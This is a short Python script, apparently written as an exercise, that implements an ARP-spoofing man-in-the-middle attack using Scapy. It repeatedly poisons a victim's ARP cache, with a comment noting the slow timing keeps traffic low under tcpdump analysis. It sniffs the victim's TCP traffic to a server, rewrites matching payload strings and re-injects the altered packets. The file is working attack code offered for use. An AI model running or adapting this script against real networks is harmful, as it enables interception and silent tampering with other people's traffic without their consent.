# Simple ARP MitM tool developed as an exercise  
# Author: Otavio Augusto otavioarj$at$gmail.com
# At Public Domain if, and only if, the author remain unchanged or a clear reference is made to him =]
# This code completely depends on Scapy http://www.secdev.org/projects/scapy 


#!/usr/bin/env python

from threading import Thread
import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

#Packet changer
def pkgchan(pkt):
	if not(TCP in pkt): # forcing check as tcp in filter isn't enough, for some reason....  
		return 
	raw= pkt[TCP].payload
	f = str(raw)
	#print raw
	if 'MO639' in f: # Will search and change MO639 to Ooops
		f=f.replace('MO639','Ooops') # data change, mission accomplished! 
		pkt[TCP].payload=f
		del pkt[TCP].chksum  # checksum isn't automatic updated
		#pkt.show()
		sendp(pkt)

# ARP Cache Poison 
# Mode 1 poison
#      2 unpoison
def arpp(target, victim,mode):
	if mode>1:
		fsrc=getmacbyip(target)
		brk=True
	else:
		fsrc=get_if_hwaddr(iface)
		brk=False
	vmac=getmacbyip(victim)
	poison= Ether(dst=vmac,src=fsrc)/ARP(op="is-at",hwdst=vmac,hwsrc=fsrc,psrc=target, pdst=victim) # Scapy don't update ARP HW addrs automatically 
	#poison.show()
	while 1:
		sendp(poison)
		if brk:
			break
		time.sleep(30) # High delay to have low traffic at tcpdump analysis
		


#### Explicit Main =] ####

if len(sys.argv) < 3 or os.geteuid() != 0:
	print "[*] Usage:", sys.argv[0] ," victim_ip[can be broadcast addr]  target_ip [iface (default eth0)]"
	print "[!] Make sure you're root and have *packet forwarding* on kernel enabled!\n"
	sys.exit(0)
else:
	client=sys.argv[1]
	server=sys.argv[2]

if len(sys.argv) < 4:
	interface = "eth0"
else:
	interface = sys.argv[3]

iface=interface
# Arp poison =]
th=Thread(target=arpp,args=(server,client,1))

try:
	th.daemon=True
	th.start()
	sniff(filter='(tcp and (dst %s and src %s))'%(server,client),prn=pkgchan,store=0)
except:
	pass
finally:
	print "[*] Repoisoning victims"
	arpp(server,client,2) 
	sys.exit(0)



